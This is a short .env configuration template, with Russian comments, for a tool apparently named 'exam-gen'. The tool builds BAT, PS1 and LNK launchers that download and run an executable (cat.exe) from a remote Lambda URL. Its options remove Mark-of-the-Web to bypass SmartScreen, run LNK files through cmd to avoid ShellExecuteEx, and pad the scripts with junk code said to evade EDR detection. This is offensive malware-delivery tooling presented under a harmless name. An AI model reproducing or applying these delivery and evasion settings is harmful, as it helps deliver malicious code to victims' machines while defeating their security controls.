# exam-gen configuration
# Copy this file to .env and fill in your values

# === Обязательные ===
LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=your-api-key-here

# === Файлы и пути ===
TARGET_FILENAME=cat.exe
VARIANTS_DIR=./variants
OUTPUT_DIR=./output

# === Метод доставки ===
#   webclient      — DownloadFile + Start-Process (простой, но MOTW)
#   base64_recycle — DownloadData + WriteAllBytes + MOTW removal (обход SmartScreen)
DELIVERY_METHOD=base64_recycle

# === Обход MOTW для LNK ===
# Непустое = ON: cmd /c .\bat (минуя ShellExecuteEx / SmartScreen)
LNK_BYPASS=1

# === Мусорный код ===
# Непустое = ON: математика, строки, даты в BAT и PS1 (бытовые операции, без триггеров EDR)
JUNK_CODE=1

# === AWS S3 (для deploy.py) ===
S3_BUCKET=your-bucket-name
S3_REGION=us-east-1
